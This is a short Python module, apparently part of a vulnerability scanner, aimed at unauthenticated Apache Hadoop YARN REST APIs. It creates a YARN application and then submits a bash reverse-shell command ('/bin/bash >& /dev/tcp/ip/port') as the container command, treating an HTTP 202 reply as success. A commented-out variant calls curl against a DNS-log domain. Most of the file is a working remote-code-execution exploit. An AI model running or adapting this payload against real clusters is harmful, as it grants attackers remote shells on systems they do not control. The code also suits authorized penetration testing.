#!/usr/bin/env python3
# -*- coding:utf-8 -*-

unauthorized_payloads = [
    {
        'path': 'ws/v1/cluster/apps/new-application',
        'data': ''
    },
    # {
    #     'path': 'ws/v1/cluster/apps',
    #     'data': {
    #         'application-id': '',
    #         'application-name': 'mouse',
    #         'am-container-spec': {
    #             'commands': {
    #                 'command': 'curl DNSdomain',          # * ping或curl无效, 放弃
    #             },
    #         },
    #         'application-type': 'YARN',
    #     }
    # },
    {
        'path': 'ws/v1/cluster/apps',
        'data': {
            'application-id': '',
            'application-name': 'mouse',
            'am-container-spec': {
                'commands': {
                    'command': '/bin/bash >& /dev/tcp/ip/port 0>&1',
                },
            },
            'application-type': 'YARN',
        }
    },
]

def apache_hadoop_unauthorized_scan(self, clients):
    ''' YARN默认开放REST API, 允许用户直接通过API进行相关的应用创建、任务提交执行等操作, 
        如果配置不当, 将会导致REST API未授权访问, 攻击者可利用其执行远程命令
    '''
    # sessid = '3861eb6b3d023d464efe85aa01277d27'
    client = clients.get('reqClient')

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'unAuthorized',
        'vul_id': 'ApacheHadoop-unAuth',
    }
    
    headers = {
        'Content-Type': 'application/json'
    }

    for payload in range(len(unauthorized_payloads)):
        # md = random_md5()                                       # * 随机md5值, 8位
        # dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = unauthorized_payloads[payload]['path']
        data = unauthorized_payloads[payload]['data']

        if (payload == 0):                                        # * 获取application-id
            res1 = client.request(
                'post',
                path,
                data=data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )

            try:
                if (res1.json()['application-id']):
                    self.application_id = res1.json()['application-id']
                    continue
            except:
                return None

        # command = data['am-container-spec']['commands']['command']
        # data['am-container-spec']['commands']['command'] = command.replace('DNSdomain', dns_domain)
        data['application-id'] = self.application_id

        res2 = client.request(
            'post',
            json=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        if (res2.status_code == 202):
            results = {
                'Target': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res2
            }
            return results
    return None
